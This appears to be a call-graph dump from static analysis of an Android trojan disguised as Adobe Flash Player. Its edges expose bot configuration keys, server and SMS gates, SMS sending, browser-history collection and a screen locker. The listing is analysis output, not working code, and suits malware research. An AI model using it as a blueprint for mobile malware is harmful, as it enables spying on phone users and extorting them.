SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosATmp", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void onDestroy()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r46) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotNetwork") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
CLINIT edge: staticinvoke <android.provider.ContactsContract$CommonDataKinds$Phone: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.provider.ContactsContract$CommonDataKinds$Phone: void <clinit>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=file&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<com.adobe.flashplayer_.MacrosStat$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
VIRTUAL edge: $i2 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("File") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/ADOBEcoreZa;") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>
SPECIAL edge: $r17 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("Reich_ServerGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void onDestroy()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r3 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" bytes") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("browserHistory") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r57.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAData", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: $r11 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r4 = staticinvoke <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>($l2) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r20, $r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r3.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<com.adobe.packages.ZLocker: boolean onKeyDown(int,android.view.KeyEvent)>(0, null) in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: boolean onKeyDown(int,android.view.KeyEvent)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r46) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r19 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke r3.<java.io.File: boolean canRead()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: boolean canRead()>
VIRTUAL edge: virtualinvoke $r1.<com.adobe.flashplayer_.AdobeZCore$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotVer", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("forceLock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent setFlags(int)>(1073741824) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r14 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotID") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r15 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r1 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r30.<java.lang.String: boolean equals(java.lang.Object)>("mounted") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
